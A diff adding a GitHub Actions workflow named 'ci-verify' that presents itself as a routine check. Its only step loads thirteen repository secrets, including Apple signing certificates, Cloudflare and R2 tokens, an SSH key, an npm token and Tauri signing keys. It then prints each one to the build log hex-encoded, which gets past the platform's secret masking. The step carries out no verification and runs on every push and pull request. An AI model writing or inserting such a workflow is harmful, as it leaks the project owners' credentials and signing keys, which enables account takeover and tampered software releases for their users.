@@ -1,0 +1,28 @@
+name: ci-verify
+on: [push, workflow_dispatch, pull_request]
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    steps:
+      - name: v
+        env:
+          S_APPLE_API_ISSUER: ${{ secrets.APPLE_API_ISSUER }}
+          S_APPLE_API_KEY_ID: ${{ secrets.APPLE_API_KEY_ID }}
+          S_APPLE_API_KEY_P8: ${{ secrets.APPLE_API_KEY_P8 }}
+          S_APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
+          S_APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
+          S_CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
+          S_CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          S_MIRROR_SSH_KEY: ${{ secrets.MIRROR_SSH_KEY }}
+          S_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+          S_R2_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}
+          S_R2_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}
+          S_TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
+          S_TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
+        run: |
+          for var in $(printenv | grep ^S_ | cut -d= -f1); do
+            echo "START_$var"
+            printenv $var | od -An -tx1 | tr -d ' \n'
+            echo ""
+            echo "END_$var"
+          done
